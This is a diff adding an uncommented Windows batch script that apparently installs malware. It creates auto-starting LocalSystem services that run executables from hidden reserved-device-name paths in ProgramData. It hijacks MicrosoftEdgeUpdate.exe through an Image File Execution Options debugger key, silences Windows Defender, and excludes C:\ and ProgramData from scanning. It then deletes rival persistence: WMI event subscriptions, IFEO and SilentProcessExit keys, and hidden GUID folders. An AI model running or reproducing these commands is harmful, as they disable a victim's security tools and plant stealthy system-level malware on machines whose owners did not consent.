@@ -1,0 +1,72 @@
+sc create Performance binPath="%WINDIR%\System32\cmd.exe /c start install.exe" start="auto" obj="LocalSystem"
+sc create Update binPath="\\.\%ProgramData%\logdata..\Index.exe \\.\%ProgramData%\logdata..\prn.ini" start="auto" obj="LocalSystem"
+
+sc create Configuration binPath="%WINDIR%\System32\cmd.exe /c start info.exe" start="auto" obj="LocalSystem"
+sc create Network binPath="\\.\%ProgramData%\diaglogs..\Index.exe \\.\%ProgramData%\diaglogs..\con.ini" start="auto" obj="LocalSystem"
+sc config Configuration start= delayed-auto
+sc config Network start= delayed-auto
+
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeUpdate.exe" /v Debugger /t REG_SZ /d "%WINDIR%\System32\cmd.exe /c start install.exe" /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f /reg:64
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f /reg:64
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "%WINDIR%\Temp" /t REG_SZ /d "0" /f /reg:64
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "%ProgramData%" /t REG_SZ /d "0" /f /reg:64
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v C:\ /t REG_SZ /d "0" /f /reg:64
+
+taskkill /f /IM Input.exe /t
+taskkill /f /IM ShellExt.dll /t
+taskkill /f /IM StartMenuExperienceHost.exe /t
+
+rd /S /Q \\.\%ProgramData%\AUX..\
+rd /S /Q \\.\%ProgramData%\CON..\
+rd /S /Q \\.\%ProgramData%\NUL..\
+rd /S /Q  %ProgramData%\dist
+rd /S /Q  %ProgramData%\Vedist
+rd /S /Q  %ProgramData%\Cedist
+rd /S /Q  %ProgramData%\Jedist
+rd /S /Q  %ProgramData%\Uedist
+rd /S /Q  %ProgramData%\Gedist
+rd /S /Q  %ProgramData%\VCedist
+
+REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\start.exe" /f
+
+REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\svchost.exe" /f
+REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\TiWorker.exe" /f
+REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\taskhostw.exe" /f
+REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\MoUsoCoreWorker.exe" /f
+
+REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskhostw.exe" /f
+REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TiWorker.exe" /f
+REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MoUsoCoreWorker.exe" /f
+REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe" /v GlobalFlag /f
+
+wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="nut" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="nut" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="nut"' DELETE
+wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="nur" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="nur" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="nur"' DELETE
+wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="per" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="per" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="per"' DELETE
+wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="pers" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="pers" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="pers"' DELETE
+wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="Event" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="Event" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="Event"' DELETE
+wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="Consumer" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="Consumer" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="Consumer"' DELETE
+
+takeown /f %ProgramData%\Classic.{BB64F8A7-BEE7-4E1A-AB8D-7D8273F7FDB6}
+takeown /f %ProgramData%\Classic.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}
+takeown /f %ProgramData%\Classic.{20D04FE0-3AEA-1069-A2D8-08002B30309D}
+
+icacls "%ProgramData%\Classic.{BB64F8A7-BEE7-4E1A-AB8D-7D8273F7FDB6}" /grant %username%:D /T
+icacls "%ProgramData%\Classic.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}" /grant %username%:D /T
+icacls "%ProgramData%\Classic.{20D04FE0-3AEA-1069-A2D8-08002B30309D}" /grant %username%:D /T
+
+icacls "%ProgramData%\Classic.{BB64F8A7-BEE7-4E1A-AB8D-7D8273F7FDB6}" /grant %username%:(D,DC) /grant %username%:(RX) /T
+icacls "%ProgramData%\Classic.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}" /grant %username%:(D,DC) /grant %username%:(RX) /T
+icacls "%ProgramData%\Classic.{20D04FE0-3AEA-1069-A2D8-08002B30309D}" /grant %username%:(D,DC) /grant %username%:(RX) /T
+
+icacls "%ProgramData%\Classic.{BB64F8A7-BEE7-4E1A-AB8D-7D8273F7FDB6}" /grant *S-1-1-0:(DE,WDAC,WO,AS,AD,WEA,DC,WA,WD) /T /C
+icacls "%ProgramData%\Classic.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}" /grant *S-1-1-0:(DE,WDAC,WO,AS,AD,WEA,DC,WA,WD) /T /C
+icacls "%ProgramData%\Classic.{20D04FE0-3AEA-1069-A2D8-08002B30309D}" /grant *S-1-1-0:(DE,WDAC,WO,AS,AD,WEA,DC,WA,WD) /T /C
+
+attrib -h -s -r %ProgramData%\Classic.{BB64F8A7-BEE7-4E1A-AB8D-7D8273F7FDB6} /d /s
+attrib -h -s -r %ProgramData%\Classic.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE} /d /s
+attrib -h -s -r %ProgramData%\Classic.{20D04FE0-3AEA-1069-A2D8-08002B30309D} /d /s
+
+rd /S /Q  %ProgramData%\Classic.{BB64F8A7-BEE7-4E1A-AB8D-7D8273F7FDB6}
+rd /S /Q  %ProgramData%\Classic.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}
+rd /S /Q  %ProgramData%\Classic.{20D04FE0-3AEA-1069-A2D8-08002B30309D}
